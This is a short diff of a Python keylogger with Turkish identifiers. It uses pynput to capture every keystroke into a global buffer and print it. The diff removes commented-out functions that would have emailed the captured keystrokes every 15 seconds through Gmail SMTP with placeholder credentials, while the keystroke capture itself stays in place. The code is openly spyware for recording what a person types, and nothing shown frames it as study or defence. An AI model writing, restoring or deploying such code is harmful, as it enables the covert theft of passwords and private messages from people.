@@ -41,23 +41,6 @@ def emir(harfler):
             toplama +=str(harfler)
     print(toplama)
 
-# def mail_gonder(mesaj):
-#    global toplama
- #   server = smtplib.SMTP("smtp.gmail.com:587")
- #   server.starttls()
-  #  server.login("EPOSTA","SIFRE")
-  #  server.sendmail("EPOSTA","EPOSTA",mesaj)
-  #  server.quit()
-
-#def dallama():
- #   global toplama
-  #  if toplama:
- #       mail_gonder(toplama)
-  #  toplama=""
-  #  timer = threading.Timer(15,dallama)
-  #  timer.start()
-
-
 dinleme = pynput.keyboard.Listener(on_press=emir)
 
 with dinleme:
